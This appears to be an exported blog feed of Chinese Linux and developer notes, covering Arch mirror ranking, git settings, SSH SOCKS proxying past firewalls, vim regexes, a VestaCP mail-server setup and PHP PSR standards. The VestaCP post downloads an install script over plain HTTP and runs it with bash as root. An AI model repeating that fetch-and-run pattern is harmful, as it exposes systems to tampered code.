    <content><![CDATA[<p>许多镜像站没在官方的列表里,可以手动添加到你的镜像列表里,但这些镜像有可能很长时间没有更新了,可以从<span class="exturl" data-url="aHR0cHM6Ly93d3cuYXJjaGxpbnV4Lm9yZy9taXJyb3JzL3N0YXR1cy8=" title="https://www.archlinux.org/mirrors/status/">这里<i class="fa fa-external-link"></i></span>检查镜像状态.</p>
<ul>
<li><p>电信</p>
<pre><code>*   [http://mirror.bit.edu.cn/archlinux/](http://mirror.bit.edu.cn/archlinux/) - 北京理工大学
</code></pre><ul>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9hcmNobGludXgv" title="http://mirrors.aliyun.com/archlinux/">http://mirrors.aliyun.com/archlinux/<i class="fa fa-external-link"></i></span> - 阿里巴巴</li>
</ul>
</li>
<li><p>联通</p>
<pre><code>*   [http://mirrors.sohu.com/archlinux/](http://mirrors.sohu.com/archlinux/)
</code></pre><ul>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMueXVuLWlkYy5jb20vYXJjaGxpbnV4Lw==" title="http://mirrors.yun-idc.com/archlinux/">http://mirrors.yun-idc.com/archlinux/<i class="fa fa-external-link"></i></span></li>
</ul>
</li>
<li><p>教育网</p>
<pre><code>*   [http://ftp.sjtu.edu.cn/archlinux/](http://ftp.sjtu.edu.cn/archlinux/) - 上海交通大学y
</code></pre><ul>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMuNC50dW5hLnRzaW5naHVhLmVkdS5jbi9hcmNobGludXgv" title="http://mirrors.4.tuna.tsinghua.edu.cn/archlinux/">http://mirrors.4.tuna.tsinghua.edu.cn/archlinux/<i class="fa fa-external-link"></i></span> (ipv4 only)</li>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvcnMuNi50dW5hLnRzaW5naHVhLmVkdS5jbi9hcmNobGludXgv" title="http://mirrors.6.tuna.tsinghua.edu.cn/archlinux/">http://mirrors.6.tuna.tsinghua.edu.cn/archlinux/<i class="fa fa-external-link"></i></span> (ipv6 only)</li>
<li><span class="exturl" data-url="aHR0cDovL21pcnJvci5senUuZWR1LmNuL2FyY2hsaW51eC8=" title="http://mirror.lzu.edu.cn/archlinux/">http://mirror.lzu.edu.cn/archlinux/<i class="fa fa-external-link"></i></span> - 兰州大学</li>
<li><span class="exturl" data-url="aHR0cHM6Ly9taXJyb3JzLm5qdS5lZHUuY24vYXJjaGxpbnV4Lw==" title="https://mirrors.nju.edu.cn/archlinux/">https://mirrors.nju.edu.cn/archlinux/<i class="fa fa-external-link"></i></span> - 南京大学</li>
</ul>
</li>
</ul>
<h2 id="启用镜像"><a href="#启用镜像" class="headerlink" title="启用镜像"></a><a name="t1"></a>启用镜像</h2><a id="more"></a>
<p>取消你想启用的镜像前的注释 </p>
<p>注意,使用http协议的比使用ftp的更快 </p>
<p>刷新镜像列表</p>
<p><pre class="prettyprint" name="code"><code>pacman &lt;span class=&quot;hljs-attribute&quot;&gt;-Syyu&lt;/span&gt;&lt;div class=&quot;hljs-button signin&quot; data-title=&quot;登录后复制&quot;&gt;&lt;/div&gt;</code></pre></p>
<p>要注意镜像并不是越多越好,pacman默认只会连接第一个镜像地址,除非第一个不可用才会尝试链接第二个.</p>
<p>因此可以尝试将镜像按速度排序</p>
<h2 id="将镜像按速度排序"><a href="#将镜像按速度排序" class="headerlink" title="将镜像按速度排序"></a><a name="t2"></a>将镜像按速度排序</h2><ul>
<li>使用<code>rankmirrors</code><br>备份现在的镜像文件</li>
</ul>
<p><pre class="prettyprint" name="code"><code>&lt;span class=&quot;hljs-keyword&quot;&gt;cp&lt;/span&gt; mirrorlist mirrorlist&lt;span class=&quot;hljs-preprocessor&quot;&gt;.backup&lt;/span&gt;&lt;div class=&quot;hljs-button signin&quot; data-title=&quot;登录后复制&quot;&gt;&lt;/div&gt;</code></pre></p>
<p>使用rankmirrors将mirrorlist.back里的镜像按速度排序,找出前6个放到镜像文件里</p>
<p><pre class="prettyprint" name="code"><code>rankmirrors -n &lt;span class=&quot;hljs-number&quot;&gt;6&lt;/span&gt; mirrorlist&lt;span class=&quot;hljs-preprocessor&quot;&gt;.backup&lt;/span&gt; &amp;gt; mirrorlist&lt;div class=&quot;hljs-button signin&quot; data-title=&quot;登录后复制&quot;&gt;&lt;/div&gt;</code></pre></p>
<ul>
<li>使用reflector<br>直接把最近同步的镜像按速度排序覆盖 <code>/etc/pacman.d/mirrorlist</code></li>
</ul>
<p><pre class="prettyprint" name="code"><code>&lt;span class=&quot;hljs-comment&quot;&gt;reflector&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;verbose&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;l&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;200&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;http&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;sort&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;rate&lt;/span&gt; &lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-literal&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;save&lt;/span&gt; &lt;span class=&quot;hljs-comment&quot;&gt;/etc/pacman&lt;/span&gt;&lt;span class=&quot;hljs-string&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;hljs-comment&quot;&gt;d/mirrorlist&lt;/span&gt;&lt;div class=&quot;hljs-button signin&quot; data-title=&quot;登录后复制&quot;&gt;&lt;/div&gt;</code></pre></p>
<p>因此要一个个测试连接速度,可以比较慢,耐心等就好<br>          <br>          <link href="https://csdnimg.cn/release/phoenix/mdeditor/markdown_views-258a4616f7.css" rel="stylesheet"><br>                  <br>  <br>  来源：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2t4cDk1NDUvYXJ0aWNsZS9kZXRhaWxzLzc2MTM2MTkw" title="https://blog.csdn.net/kxp9545/article/details/76136190">https://blog.csdn.net/kxp9545/article/details/76136190<i class="fa fa-external-link"></i></span></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>【git笔记-入门篇】git的配置（1）</title>
    <url>/2019/01/24/%E3%80%90git%E7%AC%94%E8%AE%B0-%E5%85%A5%E9%97%A8%E7%AF%87%E3%80%91git%E7%9A%84%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<p><img src="/images/20190125/201901250916.png" alt></p>
<h4 id="1-minttyrc-gitbash-终端配置"><a href="#1-minttyrc-gitbash-终端配置" class="headerlink" title="1 ~/.minttyrc gitbash 终端配置"></a>1 ~/.minttyrc gitbash 终端配置</h4><p>&emsp;使用<code>~/.mittyrc</code>的配置能个性化自己的<code>gitbash</code>终端显示。由于对个项目参数的知道的不多，所以就晒下个人一直用精简版的配置。<br><a id="more"></a></p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">Font=DejaVu Sans Mono <span class="keyword">for</span> Powerline</span><br><span class="line">FontHeight=13</span><br><span class="line"></span><br><span class="line">ForegroundColour=131,148,150</span><br><span class="line">BackgroundColour=0,43,54</span><br><span class="line">CursorColour=220,50,47</span><br><span class="line"></span><br><span class="line"><span class="comment">#Black=7,54,66</span></span><br><span class="line"><span class="comment">#BoldBlack=0,43,54</span></span><br><span class="line"><span class="comment">#Red=220,50,47</span></span><br><span class="line"><span class="comment">#BoldRed=203,75,22</span></span><br><span class="line"><span class="comment">#Green=133,153,0</span></span><br><span class="line"><span class="comment">#BoldGreen=88,110,117</span></span><br><span class="line"><span class="comment">#Yellow=181,137,0</span></span><br><span class="line"><span class="comment">#BoldYellow=101,123,131</span></span><br><span class="line"><span class="comment">#Blue=38,139,210</span></span><br><span class="line"><span class="comment">#BoldBlue=131,148,150</span></span><br><span class="line"><span class="comment">#Magenta=211,54,130</span></span><br><span class="line"><span class="comment">#BoldMagenta=108,113,196</span></span><br><span class="line"><span class="comment">#Cyan=42,161,152</span></span><br><span class="line"><span class="comment">#BoldCyan=147,161,161</span></span><br><span class="line"><span class="comment">#White=238,232,213</span></span><br><span class="line"><span class="comment">#BoldWhite=253,246,227</span></span><br><span class="line">BoldAsFont=-1</span><br><span class="line">FontSmoothing=full</span><br><span class="line">FontWeight=700</span><br><span class="line">FontIsBold=yes</span><br><span class="line"><span class="comment">#Locale=C</span></span><br><span class="line">Charset=UTF-8</span><br><span class="line"></span><br><span class="line">Columns=110</span><br><span class="line">Rows=26</span><br><span class="line">CursorType=block</span><br><span class="line">Locale=C</span><br><span class="line">Charset=UTF-8</span><br></pre></td></tr></table></figure></div>
<h4 id="2-git输出配色开启"><a href="#2-git输出配色开启" class="headerlink" title="2     git输出配色开启"></a>2     <code>git</code>输出配色开启</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git config --global color.ui <span class="literal">true</span></span><br></pre></td></tr></table></figure></div>
<h4 id="记录撤消"><a href="#记录撤消" class="headerlink" title="记录撤消"></a>记录撤消</h4><p>有时候一时大意会把不想提交的文件放入暂存区后一起提交到记录了，这里是个笨办法，对只是上次的提交进行撤消。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git  reset  HEAD~&lt;num回退到最后第几次的提交&gt;</span><br></pre></td></tr></table></figure></div></p>
<p>这种撤消会把撤消的记录的更改文件存在暂区里， 这时就可以把自己不想提交的文件给退出暂区，然后再次提交上去。然而这种方法在面临记录已经推送到线上时，自己修改好的记录只能强行推送上去，这种访求粗爆的方式在多人开发维护线上的分支时会造成已经拉取代码的小伴在代码强行推送后会造成冲突的可能，那时需要回退那个撤消的记录再拉取一次代码下来的情况 ，所以要根据自己的情况来决定。</p>
<h4 id="3-git-status中文文件名显示乱码"><a href="#3-git-status中文文件名显示乱码" class="headerlink" title="3 git status中文文件名显示乱码"></a>3 <code>git status</code>中文文件名显示乱码</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">git config --global core.quotepath false</span><br><span class="line">export LESSCHARSET=utf-8 // 加入~/.bashrc 则每次登录都生效</span><br></pre></td></tr></table></figure></div>
<h4 id="设置vim为默认编辑器"><a href="#设置vim为默认编辑器" class="headerlink" title="设置vim为默认编辑器"></a>设置<code>vim</code>为默认编辑器</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git config –global core.editor</span><br></pre></td></tr></table></figure></div>]]></content>
  </entry>
  <entry>
    <title>【linux】git使用ssh通道代理访问仓库</title>
    <url>/2019/01/24/linux%E3%80%91git%E4%BD%BF%E7%94%A8ssh%E9%80%9A%E9%81%93%E4%BB%A3%E7%90%86%E8%AE%BF%E9%97%AE%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<p>&emsp;在国内访问github真的很慢，原因你懂的。通过<code>ssh</code>代理来提高访问速度的前提是防火墙外要有一个做代理的主机才可行。<br><img src="http://qiniu.wuchuheng.com/20190124-235445.png" alt><br><a id="more"></a></p>
<h4 id="1-https代理设置"><a href="#1-https代理设置" class="headerlink" title="1 https代理设置"></a>1 https代理设置</h4><h5 id="1-1-git客户端配置"><a href="#1-1-git客户端配置" class="headerlink" title="1.1 git客户端配置"></a>1.1 git客户端配置</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git config --global https.proxy https://127.0.0.1:&lt;port&gt;</span><br><span class="line">git config --global https.proxy http://127.0.0.1:&lt;port&gt;</span><br></pre></td></tr></table></figure></div>
<p><strong><em>注</em></strong> 撤消：<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br></pre></td></tr></table></figure></div></p>
<h5 id="1-2-ssh转发配置"><a href="#1-2-ssh转发配置" class="headerlink" title="1.2 ssh转发配置"></a>1.2 ssh转发配置</h5><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">ssh -N -D 127.0.0.1:&lt;port&gt; &lt;user&gt;@&lt;romote host&gt;</span><br></pre></td></tr></table></figure></div>
<p><strong><em> 注</em></strong> ：端口同上</p>
<h5 id="1-3-使用"><a href="#1-3-使用" class="headerlink" title="1.3 使用"></a>1.3 使用</h5><p>&emsp; 正常使用<code>git clone https://github.com/&lt;user&gt;/&lt;rep&gt;</code>就行。</p>
<p>还有<code>socks5</code>方式和<code>ssh</code>方式，等我需要用的时候再来总结。拜拜！！！</p>
]]></content>
  </entry>
  <entry>
    <title> 【linux】科学上网</title>
    <url>/2019/01/06/%E3%80%90linux%E3%80%91%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/</url>
    <content><![CDATA[<h4 id="1-简单的ssh隧道实现代理上网"><a href="#1-简单的ssh隧道实现代理上网" class="headerlink" title="1 简单的ssh隧道实现代理上网"></a>1 简单的ssh隧道实现代理上网</h4><p>如果你有国外的服务器或者vps，(现在亚马逊云主机第一年免费)，你可以自己搭建代理服务。<br>但是vpn (pptp / openvpn) 架设和管理还是相对复杂的, 部分运营商还有限制。<br>除非你有手机用代理等需要，一定要vpn，如果是web上网的话用ssh隧道代理本地端口，简单，效果好。<br><a id="more"></a></p>
<h4 id="1-1-本地ssh客户端转发"><a href="#1-1-本地ssh客户端转发" class="headerlink" title="1.1 本地ssh客户端转发"></a>1.1 本地ssh客户端转发</h4><p>注：windowns系统可以安装个<code>git</code>命令行客户端当成ssh用户端用。回车输入密码，登录启动转发。<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">ssh -N -D 127.0.0.1:端口 用户名@服务器</span><br></pre></td></tr></table></figure></div></p>
<h4 id="1-2-chrome-浏览器端口转发"><a href="#1-2-chrome-浏览器端口转发" class="headerlink" title="1.2 chrome 浏览器端口转发"></a>1.2 chrome 浏览器端口转发</h4><p>安装个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZlbGlzQ2F0dXMvU3dpdGNoeU9tZWdhL3JlbGVhc2Vz" title="https://github.com/FelisCatus/SwitchyOmega/releases"><code>SwitchyOmega</code><i class="fa fa-external-link"></i></span>,选择<code>crx</code>后缀文件名下载，并打开谷歌扩展-&gt;选择开发者模式-&gt;把下载的插件安装文件拖过去。</p>
<h4 id="1-3-配置SwitchyOmega"><a href="#1-3-配置SwitchyOmega" class="headerlink" title="1.3 配置SwitchyOmega"></a>1.3 配置SwitchyOmega</h4><p><img src="/images/20190107175729.png" alt></p>
<h4 id="1-4-使用"><a href="#1-4-使用" class="headerlink" title="1.4 使用"></a>1.4 使用</h4><p><img src="/images/20190107184002.png" alt></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title>【vim】vim字符串处理</title>
    <url>/2019/01/06/%E3%80%90vim%E3%80%91vim%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h4 id="1-排序"><a href="#1-排序" class="headerlink" title="1 排序"></a>1 排序</h4><h4 id="1-1-vim内部处理"><a href="#1-1-vim内部处理" class="headerlink" title="1.1 vim内部处理"></a>1.1 vim内部处理</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">:[<span class="built_in">range</span>] <span class="keyword">sort</span></span><br></pre></td></tr></table></figure></div>
<h4 id="2-去重"><a href="#2-去重" class="headerlink" title="2 去重"></a>2 去重</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">:g/^\(.*\)$\n\1$/d             //去除重复行</span><br><span class="line">:g/\%(^\1$\n\)\@&lt;=\(.*\)$/d       //功能同上</span><br><span class="line">:g/\%(^\1\&gt;.*$\n\)\@&lt;=\(\k\+\).*$/d  //功能同上</span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>【docker】docker笔记-配置开箱即用lnmp环境</title>
    <url>/2018/12/17/ker%E3%80%91docker%E7%AC%94%E8%AE%B0-%E9%85%8D%E7%BD%AE%E5%BC%80%E7%AE%B1%E5%8D%B3%E7%94%A8lnmp%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1 前言"></a>1 前言</h4><p>  &emsp;<code>docker</code>是一个开箱即用的工具，可网上很多以<code>docker</code>配置<code>lnmp</code>环境功能越强大，构建时间越多。而本博文要配置的<code>lnmp</code>环境是直接构建好的，使用都只要直接拉取构建好的并通过测试的镜像，不用构建就可以直接运行了。也符合开箱即用的原则，省去大量时间。</p>
<h4 id="2-大纲"><a href="#2-大纲" class="headerlink" title="2 大纲"></a>2 大纲</h4><ul>
<li>准备说明</li>
<li>配置编排文件</li>
<li>启动环境</li>
<li>小结 <a id="more"></a>
</li>
</ul>
<h4 id="3-准备说明"><a href="#3-准备说明" class="headerlink" title="3 准备说明"></a>3 准备说明</h4><ul>
<li>要安装好<code>docker</code>,没有安装请根据自己的系统情况参照<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vaW5zdGFsbC8jc3VwcG9ydGVkLXBsYXRmb3Jtcw==" title="https://docs.docker.com/install/#supported-platforms">docker官方说明文档<i class="fa fa-external-link"></i></span>来安装。</li>
<li>要安装<code>docker-compose</code>，没有的，<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLmRvY2tlci5jb20vY29tcG9zZS9pbnN0YWxsLyN1cGdyYWRpbmc=" title="https://docs.docker.com/compose/install/#upgrading">官方安装说明文档在这<i class="fa fa-external-link"></i></span>。</li>
</ul>
<h4 id="4-配置编排文件"><a href="#4-配置编排文件" class="headerlink" title="4 配置编排文件"></a>4 配置编排文件</h4>]]></content>
  </entry>
  <entry>
    <title>【linux】鸽舍笔记-怎么搭建邮件服务器</title>
    <url>/2018/12/14/%E3%80%90linux%E3%80%91%E9%B8%BD%E8%88%8D%E7%AC%94%E8%AE%B0-%E6%80%8E%E4%B9%88%E6%90%AD%E5%BB%BA%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[<h4 id="1-前方"><a href="#1-前方" class="headerlink" title="1 前方"></a>1 前方</h4><p>  &emsp;想自己搭建自己的邮件服务器很久了.以前用的是网易邮件,托网易的强大技术团队倒是没怎么收到垃圾邮件,却总能看到网易的推广邮件,令人无奈.我也找过国内的几大型邮件平台,也是一样的情况.不得已只能自己搭建了.<br>  &emsp;要是自己开发邮件服务软件肯定是赶不上的,好在有现成的可以拿来用. 国外vesacp面板是一套vps控制面板,当中就有现成的邮件服务集成在里面,安装后就可以直接拿来用了.</p>
<h4 id="2-准备"><a href="#2-准备" class="headerlink" title="2 准备"></a>2 准备</h4><ul>
<li>一台内存不少于1G的主机,且有独立的公网IP</li>
<li>一个域名，并解析到目标主机上(本次是使用wuchuheng.com这个域名来演示)<blockquote>
<p>意，买主机时最好问下有没有封25端口，国内阿里云和腾讯云等大型云服务提供商是默认封25端口，这样是发不出邮件的，这点要注意。</p>
</blockquote>
</li>
</ul>
<hr>
<a id="more"></a>
<h4 id="3-安装vesta控制面板"><a href="#3-安装vesta控制面板" class="headerlink" title="3 安装vesta控制面板"></a>3 安装vesta控制面板</h4> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Connect to your server as root via SSH</span></span><br><span class="line">ssh root@your.server</span><br><span class="line"><span class="comment"># Download installation script</span></span><br><span class="line">curl -O http://vestacp.com/pub/vst-install.sh</span><br><span class="line"><span class="comment"># Run it</span></span><br><span class="line">bash vst-install.sh</span><br></pre></td></tr></table></figure></div>
<p>安装过程会提示，需要输入域名。输入后回车，等自动安装完成就行了。<br>注:建议用<code>debian</code>系列安装,之前用<code>centos7.6</code>安装出现了各种问题。<br><span class="exturl" data-url="aHR0cHM6Ly92ZXN0YWNwLmNvbS9pbnN0YWxsLw==" title="https://vestacp.com/install/">官方安装文档<i class="fa fa-external-link"></i></span><br>安装完成后，会显示web后台登录链接、管理员、密码和默认的8083端口;<br><img src="/images/20181215/20181215083605.png" alt="vesta后台登录"></p>
<h4 id="4-添加邮箱帐号"><a href="#4-添加邮箱帐号" class="headerlink" title="4 添加邮箱帐号"></a>4 添加邮箱帐号</h4><p>  &emsp;系统安装完成后会默认把安装时提示输入的域名作为邮件的域名。可以根据自己的情况来修改。  </p>
<h4 id="4-1-添加帐号"><a href="#4-1-添加帐号" class="headerlink" title="4.1 添加帐号"></a>4.1 添加帐号</h4><p>  &emsp;点击邮箱服务，在一个域名中点击添加帐户。<br>   <img src="/images/20181215/20181215084738.png" alt="vesta后台登录"></p>
<h4 id="4-2-填写帐号信息"><a href="#4-2-填写帐号信息" class="headerlink" title="4.2 填写帐号信息"></a>4.2 填写帐号信息</h4><p> <img src="/images/20181215/201812150847381.png" alt="vesta后台登录"><br>  &emsp;如果不想把自己新建的帐号信息发送到指定的邮箱，也可以不写上。</p>
<h4 id="5-登录邮箱"><a href="#5-登录邮箱" class="headerlink" title="5 登录邮箱"></a>5 登录邮箱</h4><p>   &emsp;既然邮箱服务和帐号都有了，接下来就是测试了。</p>
<h4 id="5-1-登录控制面板内置网页邮箱"><a href="#5-1-登录控制面板内置网页邮箱" class="headerlink" title="5.1 登录控制面板内置网页邮箱"></a>5.1 登录控制面板内置网页邮箱</h4><p>   &emsp;访问 <code>http://&lt;domain&gt;/webmail</code>,输入新<br>  建的帐号密码，并登录。<br>  <img src="/images/20181215/20181215090658.png" alt="vesta后台登录"></p>
<h4 id="5-2-进入web邮箱后台，并测试收发邮件"><a href="#5-2-进入web邮箱后台，并测试收发邮件" class="headerlink" title="5.2 进入web邮箱后台，并测试收发邮件"></a>5.2 进入web邮箱后台，并测试收发邮件</h4><p>  <strong>邮件后台</strong><br>  <img src="/images/20181215/20181215091248.png" alt="vesta邮件后台"><br>  <br><br>  <strong>发送测试邮件</strong><br>  <img src="/images/20181215/20181215091919.png" alt="vesta邮件后台"><br>  注：在发送时发现网页加载少了一个js库文件而导致邮件不能发送出去，可以下载 <span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50aW55bWNlLmNvbS9zdGFibGUvdGlueW1jZS5taW4uanPvvIzlubbmlL7liLDlr7nlupTnmoTkvY3nva7vvIzliLfmlrDliqDovb3nvZHpobXlsLHlpb3jgII=" title="https://cloud.tinymce.com/stable/tinymce.min.js，并放到对应的位置，刷新加载网页就好。">https://cloud.tinymce.com/stable/tinymce.min.js，并放到对应的位置，刷新加载网页就好。<i class="fa fa-external-link"></i></span><br>  <img src="/images/20181215/20181215094026.png" alt="vesta邮件后台"><br>   用<span class="exturl" data-url="bWFpbHRvOmFkbWluQHd1Y2h1aGVuZy5jb20=" title="mailto:admin@wuchuheng.com">admin@wuchuheng.com<i class="fa fa-external-link"></i></span> 发送到 <span class="exturl" data-url="bWFpbHRvOnd1Y2h1aGVuZ0AxNjMuY29t" title="mailto:wuchuheng@163.com">wuchuheng@163.com<i class="fa fa-external-link"></i></span> 的邮件测试是成功的。<br>  <br><br>   <strong>接收邮件测试</strong><br>   <img src="/images/20181215/20181215094724.png" alt="vesta邮件后台"></p>
<h4 id="6-配置邮件客户端"><a href="#6-配置邮件客户端" class="headerlink" title="6 配置邮件客户端"></a>6 配置邮件客户端</h4><p>   &emsp;邮件客户端相对于网页，邮件客户端体验会更好些，消息提示及时和友好，让用户更专注邮件内容的本身，而用邮件客户端来接收邮件也一直是大多数人的习惯。<br>   <br></p>
<h4 id="6-1-配置域名解析"><a href="#6-1-配置域名解析" class="headerlink" title="6.1 配置域名解析"></a>6.1 配置域名解析</h4><p>   <img src="/images/20181215/20181215100826.png" alt="vesta邮件后台"><br>   &emsp;以上是<code>wuchuheng.com</code>域名的解析记录。当中<code>MX</code>记录不能少，它是确保能接收到其它邮件的前提，记录值可以写是IP域指向邮件服务器的域名，为了防止同CNAME记录冲突，直接写上IP会保险些。而其它三条记录，为了方便记忆和服务迁移，也写上，行业的规范就是这么干的。</p>
<h4 id="6-2-配置客户端"><a href="#6-2-配置客户端" class="headerlink" title="6.2 配置客户端"></a>6.2 配置客户端</h4><p>  &emsp;这里，我们用foxmail来当作邮件接收终端，并输入帐号和密码。点击创建。<br>  <img src="/images/20181215/20181215105729.png" alt="配置foxmail客户端"><br>  &emsp;不用ssl，把smtp端口设置为587，接收类型是IMAP,选择STARTTLS加密，再次点击创建。<br>  <img src="/images/20181215/20181215105927.png" alt="配置foxmail客户端"><br>  注：使用手机端邮箱APP登录，帐号和参数基本一样的。</p>
<h4 id="6-3-测试客户端收发"><a href="#6-3-测试客户端收发" class="headerlink" title="6.3 测试客户端收发"></a>6.3 测试客户端收发</h4><p>  <strong>foxmail客户端接收邮件测试</strong><br>  <img src="/images/20181215/201812151231142.png" alt="foxmail客户端接收邮件测试"><br>&emsp;试结果：foxmail基本能在3秒内提示用户有新的邮件，后面测试接收附件也是正常的。<br>   <strong>foxmail客户端发送邮件测试</strong><br>   <img src="/images/20181215/2018121511141511.png" alt="foxmail客户端接收邮件测试"><br>   测试结果:客户发送邮件也是正常的，后面又测试了发送附件功能，也是正常的。</p>
<h4 id="7-总结"><a href="#7-总结" class="headerlink" title="7 总结"></a>7 总结</h4><p>  &emsp;使用vesta搭建的邮件服务，除了能避免邮件运营商对自己的邮箱的推广侵害外，邮件该有的功能也基本都有。 </p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>email</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php笔记-PSR[0-4]规范(转载)</title>
    <url>/2018/11/28/%E3%80%90php%E3%80%91php%E7%AC%94%E8%AE%B0-PSR0-4%E8%A7%84%E8%8C%83/</url>
    <content><![CDATA[<p><code>PHP</code>是世界上最伟大的语言，这一点是毋庸置疑的吧。哈哈哈哈哈哈 。这个霸气的开头不错！(^__^)</p>
<p>但是正是因为伟大，所以用的人也就多了，人一多，再牛逼再伟大的东西，都会产生问题，逐渐就造成了很多的分歧。每个人的习惯不一样，所以在一些<code>PHP</code>语法上的一些表现也是千差万别，比如这些问题：</p>
<blockquote>
<p><code>function</code> 函数名是否驼峰命名，<br>花括号{}是否换行写，<br>是该写注释呢还是不写<br>变量名是大写还是小写，<br>一个php文件中是一个类好还是允许有多个</p>
</blockquote>
<hr>
<a id="more"></a>
<p>等等一系列的问题，接踵而至，你说你的这种方式屌，我说你傻逼啊我的才好。所以。各种争执声此起彼伏。<br>特别是当你去接手上任留下的坑的时候，如果你有自己的规范或者你是处女座，你就会骂死那个狗日的一万遍了，每改一次就会改一遍骂：“麻痹的写的都是什么狗shit烂代码啊”。所以，在<code>PHP</code>程序员的心中一个共有的心愿诞生了：“能不能他妈的大家都遵守同一规范啊”。<br>好，既然大家都有共同的心声，那么这样一个的公共的规范就出来了，他就是<code>PSR-[0-4]</code>规范，它出来后，大家都觉得挺不错的啊，还蛮符合自己的书写风格的，渐渐的大家都知道了它，也慢慢的接受了它，越来越多的人知道了它，一些大牛的项目都慢慢的遵守了这个规范，然后也一帮菜鸟一看大牛都在用这个规范，我为啥不也尝试着规范一下呢？<br>所以，渐渐的<code>PSR-[0-4]</code>规范成为了<code>PHP</code>的一个王牌规范，你写<code>PHP</code>就最好必须按照这里面的规范写，全球共享好代码。</p>
